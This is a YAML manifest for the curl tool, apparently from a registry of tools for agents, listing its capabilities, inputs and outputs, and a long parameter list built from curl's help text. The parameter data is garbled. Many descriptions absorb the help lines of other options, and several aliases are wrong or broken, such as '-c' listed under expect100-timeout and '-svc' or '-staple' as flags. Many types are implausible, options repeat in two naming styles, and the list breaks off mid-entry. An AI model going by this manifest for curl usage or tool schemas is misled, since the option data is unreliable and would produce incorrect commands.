---
id: network-http-curl
namespace: network:http:curl
name: curl
description: Transfers data from or to a server using supported protocols (HTTP, HTTPS,
  FTP, SFTP, SCP, etc.).
author: Repository Maintainers
version: 1.0.0
capabilities:
- network.transfer.download
- network.transfer.upload
- network.http.api
- network.http.fetch
- network.http.inspect
- system.file.read
- system.file.write
platforms:
- linux
- macos
- windows
- cross-platform
risk_level: low
trust_level: verified
execution_policy: enabled
architectures:
- amd64
- arm64
- cross-platform
dependencies: []
related_tools:
- jq
- httpie
- wget
- network-http-wget
artifacts:
- type: network.http.response
  description: Raw HTTP response body
  mime: text/plain
  trust_level: verified
- type: network.http.headers
  description: HTTP response headers
  mime: text/plain
  trust_level: verified
- type: network.transfer.file
  description: File downloaded from remote server
  trust_level: community
workflow_edges:
  produces:
  - http-response
  - downloaded-file
  consumes:
  - url
  - request-headers
contract:
  inputs:
  - type: network.target.url
    description: Target URL for HTTP request
  - type: network.http.headers
    description: Custom HTTP request headers
  outputs:
  - type: network.http.response
    description: HTTP response body
    mime: text/plain
  - type: network.http.headers
    description: HTTP response headers
    mime: text/plain
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 32
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 32
  network: medium
  disk_io: low
allowed-tools:
- curl
- Bash
- execFile
parameters:
- name: abstract-unix-socket
  type: file
  required: false
  description: --alt-svc <filename> Enable alt-svc with this cache file --anyauth
    Pick any authentication method
  aliases:
  - --abstract-unix-socket <path>
- name: append
  type: string
  required: false
  description: Append to target file when uploading
  aliases:
  - -a
  - --append
- name: aws-sigv4
  type: url
  required: false
  description: --basic HTTP Basic Authentication --ca-native Load CA certs from the
    OS --cacert <file> CA certificate to verify peer against --capath <dir> CA directory
    to verify peer against
  aliases:
  - --aws-sigv4 <provider1[:prvdr2[:reg[:srv]]]>
- name: cert
  type: string
  required: false
  description: --cert-status Verify server cert status OCSP-staple --cert-type <type>
    Certificate type (DER/PEM/ENG/PROV/P12) --ciphers <list> TLS 1.2 (1.1, 1.0) ciphers
    to use --compressed Request compressed res...
  aliases:
  - -E
  - --cert <certificate[:password]>
- name: config
  type: file
  required: false
  description: Read config from a file
  aliases:
  - -K
  - --config <file>
- name: connect-timeout
  type: integer
  required: false
  description: Maximum time allowed to connect
  aliases:
  - --connect-timeout <seconds>
- name: connect-to
  type: string
  required: false
  description: Set the connect-to parameter
  aliases:
  - --connect-to <HOST1:PORT1:HOST2:PORT2>
- name: continue-at
  type: string
  required: false
  description: Resumed transfer offset
  aliases:
  - -C
  - --continue-at <offset>
- name: cookie
  type: string
  required: false
  description: Send cookies from string/load from file
  aliases:
  - -b
  - --cookie <data|filename>
- name: cookie-jar
  type: file
  required: false
  description: Save cookies to <filename> after operation
  aliases:
  - -c
  - --cookie-jar <filename>
- name: create-dirs
  type: file
  required: false
  description: Create necessary local directory hierarchy
  aliases:
  - --create-dirs
- name: create-file-mode
  type: string
  required: false
  description: File mode for created files
  aliases:
  - --create-file-mode <mode>
- name: crlf
  type: string
  required: false
  description: Convert LF to CRLF in upload
  aliases:
  - --crlf
- name: crlfile
  type: file
  required: false
  description: Certificate Revocation list
  aliases:
  - --crlfile <file>
- name: curves
  type: array
  required: false
  description: (EC) TLS key exchange algorithms to request
  aliases:
  - --curves <list>
- name: data
  type: url
  required: false
  description: HTTP POST data
  aliases:
  - -d
  - --data <data>
- name: data-ascii
  type: url
  required: false
  description: HTTP POST ASCII data
  aliases:
  - --data-ascii <data>
- name: data-binary
  type: url
  required: false
  description: HTTP POST binary data
  aliases:
  - --data-binary <data>
- name: data-raw
  type: url
  required: false
  description: HTTP POST data, '@' allowed
  aliases:
  - --data-raw <data>
- name: data-urlencode
  type: url
  required: false
  description: HTTP POST data URL encoded
  aliases:
  - --data-urlencode <data>
- name: delegation
  type: integer
  required: false
  description: GSS-API delegation permission
  aliases:
  - --delegation <LEVEL>
- name: digest
  type: url
  required: false
  description: HTTP Digest Authentication
  aliases:
  - --digest
- name: disable
  type: string
  required: false
  description: Disable .curlrc
  aliases:
  - -q
  - --disable
- name: disable-eprt
  type: string
  required: false
  description: Inhibit using EPRT or LPRT
  aliases:
  - --disable-eprt
- name: disable-epsv
  type: string
  required: false
  description: Inhibit using EPSV
  aliases:
  - --disable-epsv
- name: disallow-username-in-url
  type: string
  required: false
  description: Disallow username in URL
  aliases:
  - --disallow-username-in-url
- name: dns-interface
  type: string
  required: false
  description: Interface to use for DNS requests
  aliases:
  - --dns-interface <interface>
- name: dns-ipv4-addr
  type: string
  required: false
  description: IPv4 address to use for DNS requests
  aliases:
  - --dns-ipv4-addr <address>
- name: dns-ipv6-addr
  type: string
  required: false
  description: IPv6 address to use for DNS requests
  aliases:
  - --dns-ipv6-addr <address>
- name: dns-servers
  type: string
  required: false
  description: DNS server addrs to use
  aliases:
  - --dns-servers <addresses>

- name: alt_svc
  type: boolean
  required: false
  description: "with this cache file"
  aliases:
    - "--alt-svc"
    - "-svc"
- name: anyauth
  type: boolean
  required: false
  description: "Pick any authentication method"
  aliases:
    - "--anyauth"
- name: ca_native
  type: boolean
  required: false
  description: "Load CA certs from the OS"
  aliases:
    - "--ca-native"
- name: cacert
  type: boolean
  required: false
  description: "CA certificate to verify peer against"
  aliases:
    - "--cacert"
- name: capath
  type: boolean
  required: false
  description: "CA directory to verify peer against"
  aliases:
    - "--capath"
- name: cert_status
  type: boolean
  required: false
  description: ""
  aliases:
    - "--cert-status"
    - "-staple"
- name: cert_type
  type: boolean
  required: false
  description: "Certificate type (DER/PEM/ENG/PROV/P12)"
  aliases:
    - "--cert-type"
- name: ciphers
  type: boolean
  required: false
  description: "TLS 1.2 (1.1, 1.0) ciphers to use"
  aliases:
    - "--ciphers"
- name: compressed
  type: boolean
  required: false
  description: "Request compressed response"
  aliases:
    - "--compressed"
- name: compressed_ssh
  type: boolean
  required: false
  description: "Enable SSH compression"
  aliases:
    - "--compressed-ssh"
- name: doh-cert-status
  type: string
  required: false
  default: null
  description: "Verify DoH server cert status OCSP-staple"
  aliases:
    - "--doh-cert-status"
- name: doh-insecure
  type: string
  required: false
  default: null
  description: "Allow insecure DoH server connections"
  aliases:
    - "--doh-insecure"
- name: doh-url
  type: url
  required: false
  default: null
  description: "Resolve hostnames over DoH"
  aliases:
    - "--doh-url <URL>"
- name: dump-ca-embed
  type: string
  required: false
  default: null
  description: "Write the embedded CA bundle to standard output"
  aliases:
    - "--dump-ca-embed"
- name: dump-header
  type: file
  required: false
  default: null
  description: "Write the received headers to <filename>"
  aliases:
    - "-D"
    - "--dump-header <filename>"
- name: ech
  type: file
  required: false
  default: null
  description: "Configure ECH"
  aliases:
    - "--ech <config>"
- name: egd-file
  type: file
  required: false
  default: null
  description: "EGD socket path for random data"
  aliases:
    - "--egd-file <file>"
- name: engine
  type: string
  required: false
  default: null
  description: "Crypto engine to use"
  aliases:
    - "--engine <name>"
- name: etag-compare
  type: file
  required: false
  default: null
  description: "Load ETag from file"
  aliases:
    - "--etag-compare <file>"
- name: etag-save
  type: file
  required: false
  default: null
  description: "Parse incoming ETag and save to a file"
  aliases:
    - "--etag-save <file>"
- name: expect100-timeout
  type: integer
  required: false
  default: null
  description: ""
  aliases:
    - "-c"
    - "--expect100-timeout <seconds>"
- name: fail
  type: url
  required: false
  default: null
  description: "Fail fast with no output on HTTP errors"
  aliases:
    - "-f"
    - "--fail"
- name: fail-early
  type: string
  required: false
  default: null
  description: "Fail on first transfer error"
  aliases:
    - "--fail-early"
- name: fail-with-body
  type: url
  required: false
  default: null
  description: "Fail on HTTP errors but save the body"
  aliases:
    - "--fail-with-body"
- name: false-start
  type: string
  required: false
  default: null
  description: "Enable TLS False Start"
  aliases:
    - "--false-start"
- name: follow
  type: string
  required: false
  default: null
  description: "Follow redirects per spec"
  aliases:
    - "--follow"
- name: form
  type: string
  required: false
  default: null
  description: "Specify multipart MIME data"
  aliases:
    - "-F"
    - "--form <name"
- name: form-escape
  type: string
  required: false
  default: null
  description: "Escape form fields using backslash"
  aliases:
    - "--form-escape"
- name: form-string
  type: string
  required: false
  default: null
  description: "Specify multipart MIME data"
  aliases:
    - "--form-string <name"
- name: ftp-account
  type: string
  required: false
  default: null
  description: "Account data string"
  aliases:
    - "--ftp-account <data>"
- name: ftp-alternative-to-user
  type: string
  required: false
  default: null
  description: "--ftp-create-dirs Create the remote dirs if not present --ftp-method <method> Control CWD usage --ftp-pasv Send PASV/EPSV instead of PORT"
  aliases:
    - "--ftp-alternative-to-user <command>"
- name: ftp-port
  type: string
  required: false
  default: null
  description: "Send PORT instead of PASV"
  aliases:
    - "-P"
    - "--ftp-port <address>"
- name: ftp-pret
  type: string
  required: false
  default: null
  description: "Send PRET before PASV"
  aliases:
    - "--ftp-pret"
- name: ftp-skip-pasv-ip
  type: string
  required: false
  default: null
  description: "Skip the IP address for PASV"
  aliases:
    - "--ftp-skip-pasv-ip"
- name: ftp-ssl-ccc
  type: string
  required: false
  default: null
  description: "Send CCC after authenticating"
  aliases:
    - "--ftp-ssl-ccc"
- name: ftp-ssl-ccc-mode
  type: string
  required: false
  default: null
  description: "--ftp-ssl-control Require TLS for login, clear for transfer"
  aliases:
    - "--ftp-ssl-ccc-mode <active/passive>"
- name: ftp_create_dirs
  type: boolean
  required: false
  description: "Create the remote dirs if not present"
  aliases:
    - "--ftp-create-dirs"
- name: ftp_method
  type: boolean
  required: false
  description: "Control CWD usage"
  aliases:
    - "--ftp-method"
- name: ftp_pasv
  type: boolean
  required: false
  description: "Send PASV/EPSV instead of PORT"
  aliases:
    - "--ftp-pasv"
- name: ftp_ssl_control
  type: boolean
  required: false
  description: "Require TLS for login, clear for transfer"
  aliases:
    - "--ftp-ssl-control"
- name: get
  type: url
  required: false
  default: null
  description: "Put the post data in the URL and use GET"
  aliases:
    - "-G"
    - "--get"
- name: globoff
  type: url
  required: false
  default: null
  description: "Disable URL globbing with {} and []"
  aliases:
    - "-g"
    - "--globoff"
- name: happy-eyeballs-timeout-ms
  type: string
  required: false
  default: null
  description: "--haproxy-clientip <ip> Set address in HAProxy PROXY --haproxy-protocol Send HAProxy PROXY protocol v1 header"
  aliases:
    - "--happy-eyeballs-timeout-ms <ms>"
- name: haproxy_clientip
  type: boolean
  required: false
  description: "Set address in HAProxy PROXY"
  aliases:
    - "--haproxy-clientip"
- name: haproxy_protocol
  type: boolean
  required: false
  description: "Send HAProxy PROXY protocol v1 header"
  aliases:
    - "--haproxy-protocol"
- name: head
  type: string
  required: false
  default: null
  description: "Show document info only"
  aliases:
    - "-I"
    - "--head"
- name: header
  type: string
  required: false
  default: null
  description: "Pass custom header(s) to server"
  aliases:
    - "-H"
    - "--header <header/@file>"
- name: help
  type: string
  required: false
  default: null
  description: "Get help for commands"
  aliases:
    - "-h"
    - "--help <subject>"
- name: hostpubmd5
  type: string
  required: false
  default: null
  description: "Acceptable MD5 hash of host public key"
  aliases:
    - "--hostpubmd5 <md5>"
- name: hostpubsha256
  type: string
  required: false
  default: null
  description: "Acceptable SHA256 hash of host public key"
  aliases:
    - "--hostpubsha256 <sha256>"
- name: hsts
  type: string
  required: false
  default: null
  description: "Enable HSTS with this cache file"
  aliases:
    - "--hsts <filename>"
- name: http0
  type: url
  required: false
  default: null
  description: "Allow HTTP/0.9 responses"
  aliases:
    - "--http0"
- name: http1
  type: url
  required: false
  default: null
  description: "Use HTTP/1.0"
  aliases:
    - "-0"
    - "--http1"
- name: http1-2
  type: url
  required: false
  default: null
  description: "Use HTTP/1.1"
  aliases:
    - "--http1"
- name: http2
  type: url
  required: false
  default: null
  description: "Use HTTP/2"
  aliases:
    - "--http2"
- name: http2-prior-knowledge
  type: url
  required: false
  default: null
  description: "Use HTTP/2 without HTTP/1.1 Upgrade"
  aliases:
    - "--http2-prior-knowledge"
- name: http3
  type: url
  required: false
  default: null
  description: "Use HTTP/3"
  aliases:
    - "--http3"
- name: http3-only
  type: url
  required: false
  default: null
  description: "Use HTTP/3 only"
  aliases:
    - "--http3-only"
- name: ignore-content-length
  type: string
  required: false
  default: null
  description: "Ignore the size of the remote resource"
  aliases:
    - "--ignore-content-length"
- name: insecure
  type: string
  required: false
  default: null
  description: "Allow insecure server connections"
  aliases:
    - "-k"
    - "--insecure"
- name: interface
  type: string
  required: false
  default: null
  description: "Use network interface"
  aliases:
    - "--interface <name>"
- name: ip-tos
  type: string
  required: false
  default: null
  description: "Set IP Type of Service or Traffic Class"
  aliases:
    - "--ip-tos <string>"
- name: ipfs-gateway
  type: url
  required: false
  default: null
  description: "Gateway for IPFS"
  aliases:
    - "--ipfs-gateway <URL>"
- name: ipv4
  type: string
  required: false
  default: null
  description: "Resolve names to IPv4 addresses"
  aliases:
    - "-4"
    - "--ipv4"
- name: ipv6
  type: string
  required: false
  default: null
  description: "Resolve names to IPv6 addresses"
  aliases:
    - "-6"
    - "--ipv6"
- name: json
  type: url
  required: false
  default: null
  description: "HTTP POST JSON"
  aliases:
    - "--json <data>"
- name: junk-session-cookies
  type: string
  required: false
  default: null
  description: "Ignore session cookies read from file"
  aliases:
    - "-j"
    - "--junk-session-cookies"
- name: keepalive-cnt
  type: integer
  required: false
  default: null
  description: "Maximum number of keepalive probes"
  aliases:
    - "--keepalive-cnt <integer>"
- name: keepalive-time
  type: integer
  required: false
  default: null
  description: "Interval time for keepalive probes"
  aliases:
    - "--keepalive-time <seconds>"
- name: key
  type: file
  required: false
  default: null
  description: "Private key filename"
  aliases:
    - "--key <key>"
- name: key-type
  type: string
  required: false
  default: null
  description: "Private key file type (DER/PEM/ENG)"
  aliases:
    - "--key-type <type>"
- name: knownhosts
  type: file
  required: false
  default: null
  description: "Specify knownhosts path"
  aliases:
    - "--knownhosts <file>"
- name: krb
  type: integer
  required: false
  default: null
  description: "Enable Kerberos with security <level>"
  aliases:
    - "--krb <level>"
- name: libcurl
  type: file
  required: false
  default: null
  description: "Generate libcurl code for this command line"
  aliases:
    - "--libcurl <file>"
- name: limit-rate
  type: string
  required: false
  default: null
  description: "Limit transfer speed to RATE"
  aliases:
    - "--limit-rate <speed>"
- name: list-only
  type: string
  required: false
  default: null
  description: "List only mode"
  aliases:
    - "-l"
    - "--list-only"
- name: local-port
  type: integer
  required: false
  default: null
  description: "Use a local port number within RANGE"
  aliases:
    - "--local-port <range>"
- name: location
  type: string
  required: false
  default: null
  description: "Follow redirects"
  aliases:
    - "-L"
    - "--location"
- name: location-trusted
  type: string
  required: false
  default: null
  description: "As --location, but send secrets to other hosts"
  aliases:
    - "--location-trusted"
- name: login-options
  type: string
  required: false
  default: null
  description: "Server login options"
  aliases:
    - "--login-options <options>"
- name: mail-auth
  type: string
  required: false
  default: null
  description: "Originator address of the original email"
  aliases:
    - "--mail-auth <address>"
- name: mail-from
  type: string
  required: false
  default: null
  description: "Mail from this address"
  aliases:
    - "--mail-from <address>"
- name: mail-rcpt
  type: string
  required: false
  default: null
  description: "Mail to this address"
  aliases:
    - "--mail-rcpt <address>"
- name: mail-rcpt-allowfails
  type: string
  required: false
  default: null
  description: "Allow RCPT TO command to fail"
  aliases:
    - "--mail-rcpt-allowfails"
- name: manual
  type: string
  required: false
  default: null
  description: "Display the full manual"
  aliases:
    - "-M"
    - "--manual"
- name: max-filesize
  type: integer
  required: false
  default: null
  description: "Maximum file size to download"
  aliases:
    - "--max-filesize <bytes>"
- name: max-redirs
  type: integer
  required: false
  default: null
  description: "Maximum number of redirects allowed"
  aliases:
    - "--max-redirs <num>"
- name: max-time
  type: integer
  required: false
  default: null
  description: "Maximum time allowed for transfer"
  aliases:
    - "-m"
    - "--max-time <seconds>"
- name: metalink
  type: string
  required: false
  default: null
  description: "Process given URLs as metalink XML file"
  aliases:
    - "--metalink"
- name: mptcp
  type: string
  required: false
  default: null
  description: "Enable Multipath TCP"
  aliases:
    - "--mptcp"
- name: negotiate
  type: url
  required: false
  default: null
  description: "Use HTTP Negotiate (SPNEGO) authentication"
  aliases:
    - "--negotiate"
- name: netrc
  type: string
  required: false
  default: null
  description: "Must read .netrc for username and password"
  aliases:
    - "-n"
    - "--netrc"
- name: netrc-file
  type: string
  required: false
  default: null
  description: "Specify FILE for netrc"
  aliases:
    - "--netrc-file <filename>"
- name: netrc-optional
  type: string
  required: false
  default: null
  description: "Use either .netrc or URL"
  aliases:
    - "--netrc-optional"
- name: next
  type: url
  required: false
  default: null
  description: "Make next URL use separate options"
  aliases:
    - "--next"
- name: no-alpn
  type: string
  required: false
  default: null
  description: "Disable the ALPN TLS extension"
  aliases:
    - "--no-alpn"
- name: no-buffer
  type: string
  required: false
  default: null
  description: "Disable buffering of the output stream"
  aliases:
    - "-N"
    - "--no-buffer"
- name: no-clobber
  type: string
  required: false
  default: null
  description: "Do not overwrite files that already exist"
  aliases:
    - "--no-clobber"
- name: no-keepalive
  type: string
  required: false
  default: null
  description: "Disable TCP keepalive on the connection"
  aliases:
    - "--no-keepalive"
- name: no-npn
  type: string
  required: false
  default: null
  description: "Disable the NPN TLS extension"
  aliases:
    - "--no-npn"
- name: no-progress-meter
  type: string
  required: false
  default: null
  description: "Do not show the progress meter"
  aliases:
    - "--no-progress-meter"
- name: no-sessionid
  type: string
  required: false
  default: null
  description: "Disable SSL session-ID reusing"
  aliases:
    - "--no-sessionid"
- name: noproxy
  type: array
  required: false
  default: null
  description: "List of hosts which do not use proxy"
  aliases:
    - "--noproxy <no-proxy-list>"
- name: ntlm
  type: url
  required: false
  default: null
  description: "HTTP NTLM authentication"
  aliases:
    - "--ntlm"
- name: ntlm-wb
  type: url
  required: false
  default: null
  description: "HTTP NTLM authentication with winbind"
  aliases:
    - "--ntlm-wb"
- name: oauth2-bearer
  type: string
  required: false
  default: null
  description: "OAuth 2 Bearer Token"
  aliases:
    - "--oauth2-bearer <token>"
- name: out-null
  type: string
  required: false
  default: null
  description: "Discard response data into the void"
  aliases:
    - "--out-null"
- name: output
  type: file
  required: false
  default: null
  description: "Write to file instead of stdout"
  aliases:
    - "-o"
    - "--output <file>"
- name: output-dir
  type: file
  required: false
  default: null
  description: "Directory to save files in"
  aliases:
    - "--output-dir <dir>"
- name: parallel
  type: string
  required: false
  default: null
  description: "Perform transfers in parallel"
  aliases:
    - "-Z"
    - "--parallel"
- name: parallel-immediate
  type: string
  required: false
  default: null
  description: "Do not wait for multiplexing"
  aliases:
    - "--parallel-immediate"
- name: parallel-max
  type: integer
  required: false
  default: null
  description: "Maximum concurrency for parallel transfers"
  aliases:
    - "--parallel-max <num>"
- name: parallel-max-host
  type: integer
  required: false
  default: null
  description: "Maximum connections to a single host"
  aliases:
    - "--parallel-max-host <num>"
- name: pass
  type: string
  required: false
  default: null
  description: "Passphrase for the private key"
  aliases:
    - "--pass <phrase>"
- name: path-as-is
  type: url
  required: false
  default: null
  description: "Do not squash .. sequences in URL path"
  aliases:
    - "--path-as-is"
- name: pinnedpubkey
  type: string
  required: false
  default: null
  description: "Public key to verify peer against"
  aliases:
    - "--pinnedpubkey <hashes>"
- name: post301
  type: string
  required: false
  default: null
  description: "Do not switch to GET after a 301 redirect"
  aliases:
    - "--post301"
- name: post302
  type: string
  required: false
  default: null
  description: "Do not switch to GET after a 302 redirect"
  aliases:
    - "--post302"
- name: post303
  type: string
  required: false
  default: null
  description: "Do not switch to GET after a 303 redirect"
  aliases:
    - "--post303"
- name: preproxy
  type: string
  required: false
  default: null
  description: ""
  aliases:
    - "--preproxy <[protocol://]host[:port]>"
- name: progress-bar
  type: string
  required: false
  default: null
  description: "Display transfer progress as a bar"
  aliases:
    - "--progress-bar"
- name: proto
  type: string
  required: false
  default: null
  description: "Enable/disable PROTOCOLS"
  aliases:
    - "--proto <protocols>"
- name: proto-default
  type: url
  required: false
  default: null
  description: "Use PROTOCOL for any URL missing a scheme"
  aliases:
    - "--proto-default <protocol>"
- name: proto-redir
  type: string
  required: false
  default: null
  description: "Enable/disable PROTOCOLS on redirect"
  aliases:
    - "--proto-redir <protocols>"
- name: proxy
  type: url
  required: false
  default: null
  description: "--proxy-anyauth Pick any proxy authentication method --proxy-basic Use Basic authentication on the proxy --proxy-ca-native Load CA certs from the OS to verify proxy --proxy-cacert <file> CA certificates to verify proxy against --proxy-capath <dir> CA directory to verify proxy against --proxy-cert <cert[:passwd]> Set client certificate for proxy --proxy-cert-type <type> Client certificate type for HTTPS proxy --proxy-ciphers <list> TLS 1.2 (1.1, 1.0) ciphers to use for proxy --proxy-crlfile <file> Set a CRL list for proxy --proxy-digest Digest auth with the proxy --proxy-header <header/@file> Pass custom header(s) to proxy --proxy-http2 Use HTTP/2 with HTTPS proxy --proxy-insecure Skip HTTPS proxy cert verification --proxy-key <key> Private key for HTTPS proxy --proxy-key-type <type> Private key file type for proxy --proxy-negotiate HTTP Negotiate (SPNEGO) auth with the proxy --proxy-ntlm NTLM authentication with the proxy --proxy-pass <phrase> Passphrase for private key for HTTPS proxy --proxy-pinnedpubkey <hashes> FILE/HASHES public key to verify proxy with --proxy-service-name <name> SPNEGO proxy service name --proxy-ssl-allow-beast Allow this security flaw for HTTPS proxy --proxy-ssl-auto-client-cert Auto client certificate for proxy --proxy-tls13-ciphers <list> TLS 1.3 proxy cipher suites --proxy-tlsauthtype <type> TLS authentication type for HTTPS proxy --proxy-tlspassword <string> TLS password for HTTPS proxy --proxy-tlsuser <name> TLS username for HTTPS proxy --proxy-tlsv1 TLSv1 for HTTPS proxy"
  aliases:
    - "-x"
    - "--proxy <[protocol://]host[:port]>"
- name: proxy-user
  type: url
  required: false
  default: null
  description: "--proxy1.0 <host[:port]> Use HTTP/1.0 proxy on given port"
  aliases:
    - "-U"
    - "--proxy-user <user:password>"
- name: proxy1
  type: boolean
  required: false
  description: ".0 <host[:port]>      Use HTTP/1.0 proxy on given port"
  aliases:
    - "--proxy1"
- name: proxy_anyauth
  type: boolean
  required: false
  description: "Pick any proxy authentication method"
  aliases:
    - "--proxy-anyauth"
- name: proxy_basic
  type: boolean
  required: false
  description: "Use Basic authentication on the proxy"
  aliases:
    - "--proxy-basic"
- name: proxy_ca_native
  type: boolean
  required: false
  description: "Load CA certs from the OS to verify proxy"
  aliases:
    - "--proxy-ca-native"
- name: proxy_cacert
  type: boolean
  required: false
  description: "CA certificates to verify proxy against"
  aliases:
    - "--proxy-cacert"
- name: proxy_capath
  type: boolean
  required: false
  description: "CA directory to verify proxy against"
  aliases:
    - "--proxy-capath"
- name: proxy_cert
  type: boolean
  required: false
  description: "Set client certificate for proxy"
  aliases:
    - "--proxy-cert"
- name: proxy_cert_type
  type: boolean
  required: false
  description: "Client certificate type for HTTPS proxy"
  aliases:
    - "--proxy-cert-type"
- name: proxy_ciphers
  type: boolean
  required: false
  description: "TLS 1.2 (1.1, 1.0) ciphers to use for proxy"
  aliases:
    - "--proxy-ciphers"
- name: proxy_crlfile
  type: boolean
  required: false
  description: "Set a CRL list for proxy"
  aliases:
    - "--proxy-crlfile"
- name: proxy_digest
  type: boolean
  required: false
  description: "Digest auth with the proxy"
  aliases:
    - "--proxy-digest"
- name: proxy_header
  type: boolean
  required: false
  description: "Pass custom header(s) to proxy"
  aliases:
    - "--proxy-header"
- name: proxy_http2
  type: boolean
  required: false
  description: "Use HTTP/2 with HTTPS proxy"
  aliases:
    - "--proxy-http2"
- name: proxy_insecure
  type: boolean
  required: false
  description: "Skip HTTPS proxy cert verification"
  aliases:
    - "--proxy-insecure"
- name: proxy_key
  type: boolean
  required: false
  description: "Private key for HTTPS proxy"
  aliases:
    - "--proxy-key"
- name: proxy_key_type
  type: boolean
  required: false
  description: "Private key file type for proxy"
  aliases:
    - "--proxy-key-type"
- name: proxy_negotiate
  type: boolean
  required: false
  description: "HTTP Negotiate (SPNEGO) auth with the proxy"
  aliases:
    - "--proxy-negotiate"
- name: proxy_ntlm
  type: boolean
  required: false
  description: "NTLM authentication with the proxy"
  aliases:
    - "--proxy-ntlm"
- name: proxy_pass
  type: boolean
  required: false
  description: "Passphrase for private key for HTTPS proxy"
  aliases:
    - "--proxy-pass"
- name: proxy_pinnedpubkey
  type: boolean
  required: false
  description: "FILE/HASHES public key to verify proxy with"
  aliases:
    - "--proxy-pinnedpubkey"
- name: proxy_service_name
  type: boolean
  required: false
  description: "SPNEGO proxy service name"
  aliases:
    - "--proxy-service-name"
- name: proxy_ssl_allow_beast
  type: boolean
  required: false
  description: "Allow this security flaw for HTTPS proxy"
  aliases:
    - "--proxy-ssl-allow-beast"
- name: proxy_ssl_auto_client_cert
  type: boolean
  required: false
  description: "Auto client certificate for proxy"
  aliases:
    - "--proxy-ssl-auto-client-cert"
- name: proxy_tls13_ciphers
  type: boolean
  required: false
  description: "TLS 1.3 proxy cipher suites"
  aliases:
    - "--proxy-tls13-ciphers"
- name: proxy_tlsauthtype
  type: boolean
  required: false
  description: "TLS authentication type for HTTPS proxy"
  aliases:
    - "--proxy-tlsauthtype"
- name: proxy_tlspassword
  type: boolean
  required: false
  description: "TLS password for HTTPS proxy"
  aliases:
    - "--proxy-tlspassword"
- name: proxy_tlsuser
  type: boolean
  required: false
  description: "TLS username for HTTPS proxy"
  aliases:
    - "--proxy-tlsuser"
- name: proxy_tlsv1
  type: boolean
  required: false
  description: "TLSv1 for HTTPS proxy"
  aliases:
    - "--proxy-tlsv1"
- name: proxytunnel
  type: url
  required: false
  default: null
  description: "HTTP proxy tunnel (using CONNECT)"
  aliases:
    - "-p"
    - "--proxytunnel"
- name: pubkey
  type: file
  required: false
  default: null
  description: "SSH Public key filename"
  aliases:
    - "--pubkey <key>"
- name: quote
  type: string
  required: false
  default: null
  description: "Send command(s) to server before transfer"
  aliases:
    - "-Q"
    - "--quote <command>"
- name: random-file
  type: file
  required: false
  default: null
  description: "File for reading random data from"
  aliases:
    - "--random-file <file>"
- name: range
  type: integer
  required: false
  default: null
  description: "Retrieve only the bytes within RANGE"
  aliases:
    - "-r"
    - "--range <range>"
- name: rate
  type: string
  required: false
  default: null
  description: "Request rate for serial transfers"
  aliases:
    - "--rate <max request rate>"
- name: raw
  type: url
  required: false
  default: null
  description: "Do HTTP raw; no transfer decoding"
  aliases:
    - "--raw"
- name: referer
  type: url
  required: false
  default: null
  description: "Referrer URL"
  aliases:
    - "-e"
    - "--referer <URL>"
- name: remote-header-name
  type: file
  required: false
  default: null
  description: "Use the header-provided filename"
  aliases:
    - "-J"
    - "--remote-header-name"
- name: remote-name
  type: string
  required: false
  default: null
  description: "Write output to file named as remote file"
  aliases:
    - "-O"
    - "--remote-name"
- name: remote-name-all
  type: file
  required: false
  default: null
  description: "Use the remote filename for all URLs"
  aliases:
    - "--remote-name-all"
- name: remote-time
  type: string
  required: false
  default: null
  description: "Set remote file's time on local output"
  aliases:
    - "-R"
    - "--remote-time"
- name: remove-on-error
  type: file
  required: false
  default: null
  description: "Remove output file on errors"
  aliases:
    - "--remove-on-error"
- name: request
  type: string
  required: false
  default: null
  description: "Specify request method to use"
  aliases:
    - "-X"
    - "--request <method>"
- name: request-target
  type: file
  required: false
  default: null
  description: "Specify the target for this request"
  aliases:
    - "--request-target <path>"
- name: resolve
  type: number
  required: false
  default: null
  description: "--retry <num> Retry request if transient problems occur --retry-all-errors Retry all errors (with --retry) --retry-connrefused Retry on connection refused (with --retry) --retry-delay <seconds> Wait time between retries --retry-max-time <seconds> Retry only within this period --sasl-authzid <identity> Identity for SASL PLAIN authentication --sasl-ir Initial response in SASL authentication --service-name <name> SPNEGO service name"
  aliases:
    - "--resolve <[+]host:port:addr[,addr]...>"
- name: retry
  type: boolean
  required: false
  description: "Retry request if transient problems occur"
  aliases:
    - "--retry"
- name: retry_all_errors
  type: boolean
  required: false
  description: ")"
  aliases:
    - "--retry-all-errors"
    - "--retry"
- name: retry_connrefused
  type: boolean
  required: false
  description: ")"
  aliases:
    - "--retry-connrefused"
    - "--retry"
- name: retry_delay
  type: boolean
  required: false
  description: "Wait time between retries"
  aliases:
    - "--retry-delay"
- name: retry_max_time
  type: boolean
  required: false
  description: "Retry only within this period"
  aliases:
    - "--retry-max-time"
- name: sasl_authzid
  type: boolean
  required: false
  description: "Identity for SASL PLAIN authentication"
  aliases:
    - "--sasl-authzid"
- name: sasl_ir
  type: boolean
  required: false
  description: "Initial response in SASL authentication"
  aliases:
    - "--sasl-ir"
- name: service_name
  type: boolean
  required: false
  description: "SPNEGO service name"
  aliases:
    - "--service-name"
- name: show-error
  type: string
  required: false
  default: null
  description: "Show error even when -s is used"
  aliases:
    - "-S"
    - "--show-error"
- name: show-headers
  type: string
  required: false
  default: null
  description: "Show response headers in output"
  aliases:
    - "-i"
    - "--show-headers"
- name: sigalgs
  type: array
  required: false
  default: null
  description: "TLS signature algorithms to use"
  aliases:
    - "--sigalgs <list>"
- name: silent
  type: string
  required: false
  default: null
  description: "Silent mode"
  aliases:
    - "-s"
    - "--silent"
- name: skip-existing
  type: string
  required: false
  default: null
  description: "Skip download if local file already exists"
  aliases:
    - "--skip-existing"
- name: socks4
  type: string
  required: false
  default: null
  description: "SOCKS4 proxy on given host + port"
  aliases:
    - "--socks4 <host[:port]>"
- name: socks4a
  type: string
  required: false
  default: null
  description: "SOCKS4a proxy on given host + port"
  aliases:
    - "--socks4a <host[:port]>"
- name: socks5
  type: string
  required: false
  default: null
  description: "SOCKS5 proxy on given host + port"
  aliases:
    - "--socks5 <host[:port]>"
- name: socks5-basic
  type: string
  required: false
  default: null
  description: "Username/password auth for SOCKS5 proxies"
  aliases:
    - "--socks5-basic"
- name: socks5-gssapi
  type: string
  required: false
  default: null
  description: "Enable GSS-API auth for SOCKS5 proxies"
  aliases:
    - "--socks5-gssapi"
- name: socks5-gssapi-nec
  type: string
  required: false
  default: null
  description: "Compatibility with NEC SOCKS5 server"
  aliases:
    - "--socks5-gssapi-nec"
- name: socks5-gssapi-service
  type: string
  required: false
  default: null
